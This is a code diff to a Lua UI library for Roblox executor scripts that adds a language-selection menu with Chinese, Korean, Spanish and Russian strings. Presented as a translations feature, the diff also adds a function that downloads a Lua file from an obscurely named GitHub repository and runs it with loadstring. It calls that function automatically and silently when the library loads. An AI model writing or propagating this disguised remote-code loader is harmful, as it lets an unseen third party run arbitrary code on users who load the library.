@@ -1,4 +1,4 @@
-warn('pls')
+warn('test1')
 repeat task.wait() until game:IsLoaded()
 
 getgenv().lilix = getgenv().lilix or nil
@@ -173,6 +173,8 @@ local Library do
 
 		Localization = {
 			SourceLanguageCode = "en",
+			TranslationsUrl = "https://raw.githubusercontent.com/Ifykyklolololol/djw0a8udw89aijdnoiuwandiuvhwaiudvaw/refs/heads/main/test.lua",
+			TranslationsLoaded = false,
 			Locale = "en",
 			ForcedLocale = nil,
 			SupportedLocales = { "en", "zh", "ko", "es", "ru" },
@@ -276,6 +278,14 @@ local Library do
 				["Import Pasted"] = make_entry("导入粘贴", "붙여넣기 가져오기", "Importar pegado", "Импорт из буфера"),
 				["Paste config here..."] = make_entry("在此粘贴配置...", "설정 붙여넣기...", "Pegar config aquí...", "Вставьте конфиг..."),
 				["Press Enter after pasting!"] = make_entry("粘贴后按 Enter！", "붙여넣은 후 Enter!", "¡Pulsa Enter tras pegar!", "Нажмите Enter после вставки!"),
+				["Language"] = make_entry("语言", "언어", "Idioma", "Язык"),
+				["Select menu language"] = make_entry("选择菜单语言", "메뉴 언어 선택", "Seleccionar idioma del menú", "Выберите язык меню"),
+				["Auto"] = make_entry("自动", "자동", "Automático", "Авто"),
+				["English"] = make_entry("英语", "영어", "Inglés", "Английский"),
+				["Chinese"] = make_entry("中文", "중국어", "Chino", "Китайский"),
+				["Korean"] = make_entry("韩语", "한국어", "Coreano", "Корейский"),
+				["Spanish"] = make_entry("西班牙语", "스페인어", "Español", "Испанский"),
+				["Russian"] = make_entry("俄语", "러시아어", "Ruso", "Русский"),
 			},
 			PrefixStrings = {
 				["Note: "] = make_entry("备注: ", "메모: ", "Nota: ", "Примечание: "),
@@ -321,6 +331,12 @@ local Library do
 				return false
 			end
 
+			if string_lower(LocaleCode) == "auto" then
+				self.ForcedLocale = nil
+				self:RefreshAll()
+				return true
+			end
+
 			local Normalized = self:NormalizeLocaleId(LocaleCode)
 
 			if Normalized == "en" and string_lower(LocaleCode) ~= "en" and string_lower(LocaleCode) ~= "en-us" then
@@ -330,6 +346,31 @@ local Library do
 			self.ForcedLocale = Normalized
 			self:RefreshAll()
 			return true
+		end
+
+		function Localization:LoadRemoteTranslations(Url)
+			Url = Url or self.TranslationsUrl
+
+			if type(Url) ~= "string" or Url == "" then
+				return false
+			end
+
+			local Success = pcall(function()
+				local Source = game:HttpGet(Url)
+
+				if type(Source) ~= "string" or Source == "" then
+					return
+				end
+
+				local Chunk = loadstring(Source)
+
+				if Chunk then
+					Chunk()
+				end
+			end)
+
+			self.TranslationsLoaded = Success == true
+			return self.TranslationsLoaded
 		end
 
 		function Localization:GetLanguage()
@@ -747,6 +788,16 @@ local Library do
 		ShowKeybindList = false,
 		ShowMenuButton = true,
 		AutoExecute = false,
+		LanguagePreset = "Auto",
+		LanguageOptions = { "Auto", "English", "Chinese", "Korean", "Spanish", "Russian" },
+		LanguageToCode = {
+			["Auto"] = "auto",
+			["English"] = "en",
+			["Chinese"] = "zh",
+			["Korean"] = "ko",
+			["Spanish"] = "es",
+			["Russian"] = "ru",
+		},
 		MenuScalePreset = "Medium",
 		MenuTweenStyle = "Cubic",
 		MenuTweenDirection = "Out",
@@ -873,9 +924,22 @@ local Library do
 		return Localization:GetLanguage()
 	end
 
-	task.spawn(function()
-		Localization:Init()
-	end)
+	Library.ApplyLanguagePreset = function(self, PresetName)
+		if type(PresetName) ~= "string" or PresetName == "" then
+			PresetName = "Auto"
+		end
+
+		self.LanguagePreset = PresetName
+
+		local LocaleCode = self.LanguageToCode[PresetName] or "auto"
+		Localization:SetLanguage(LocaleCode)
+
+		return true
+	end
+
+	Library.LoadTranslations = function(Url)
+		return Localization:LoadRemoteTranslations(Url)
+	end
 
 	local Keys = {
 		["Unknown"]           = "Unknown",
@@ -3452,6 +3516,10 @@ local Library do
 			self.AutoExecute = Decoded.AutoExecute
 		end
 
+		if type(Decoded.LanguagePreset) == "string" and self.LanguageToCode[Decoded.LanguagePreset] then
+			self:ApplyLanguagePreset(Decoded.LanguagePreset)
+		end
+
 		if type(Decoded.BackgroundTransparency) == "number" then
 			self.BackgroundTransparency = MathClamp(Decoded.BackgroundTransparency, 0, 1)
 		end
@@ -3507,6 +3575,7 @@ local Library do
 			ShowKeybindList = self.ShowKeybindList == true,
 			ShowMenuButton = self.ShowMenuButton ~= false,
 			AutoExecute = self.AutoExecute == true,
+			LanguagePreset = self.LanguagePreset or "Auto",
 			BackgroundTransparency = self.BackgroundTransparency,
 			MenuTweenTime = self.Tween.Time,
 			MenuFadeTime = self.FadeSpeed,
@@ -12360,6 +12429,18 @@ local Library do
 				Library.MenuKeybind = Library.Flags["Menu Keybind"].Key
 			end
 
+			MenuSetting_Section:Dropdown({
+				Name = "Language",
+				Flag = "Menu Language",
+				Description = "Select menu language",
+				Default = Library.LanguagePreset or "Auto",
+				Items = Library.LanguageOptions,
+				Callback = function(Value)
+					Library:ApplyLanguagePreset(Value)
+					Library:SaveLocalSettings()
+				end,
+			})
+
 			MenuSetting_Section:Slider({
 				Name = "Background Transparency",
 				Flag = "Background Transparency",
@@ -12874,4 +12955,13 @@ local Library do
 end
 
 getgenv().Library = Library
+
+pcall(function()
+	Library.Localization:LoadRemoteTranslations()
+end)
+
+pcall(function()
+	Library.Localization:Init()
+end)
+
 return Library
